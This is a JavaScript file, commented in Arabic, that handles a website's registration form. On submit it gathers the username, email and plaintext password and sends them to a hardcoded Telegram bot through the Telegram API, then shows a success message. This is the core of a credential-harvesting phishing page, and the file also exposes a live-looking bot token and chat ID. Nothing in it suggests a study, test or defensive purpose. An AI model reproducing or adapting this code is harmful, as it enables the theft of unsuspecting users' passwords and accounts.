document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("registerForm");

    form.addEventListener("submit", function (event) {
        event.preventDefault(); // منع الإرسال التقليدي

        // جمع بيانات المستخدم
        const username = document.getElementById("username").value;
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        // بيانات بوت تيليجرام
        const botToken = "8196459609:AAFFRJTY7XJ8OSVfEIVT76hf6uRiM4byJ1Y"; // ضع التوكن هنا
        const chatId = "7302541527"; // ضع الـ Chat ID هنا

        const message = `🔹 *مستخدم جديد سجل في الموقع* 🔹\n👤 *اسم المستخدم:* ${username}\n📧 *البريد الإلكتروني:* ${email}\n🔑 *كلمة المرور:* ${password}`;

        // إرسال البيانات إلى تيليجرام
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown"
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("تم التسجيل بنجاح! ✅");
                form.reset();
            } else {
                alert("حدث خطأ، حاول مرة أخرى! ❌");
            }
        })
        .catch(error => console.error("خطأ في الإرسال:", error));
    });
});
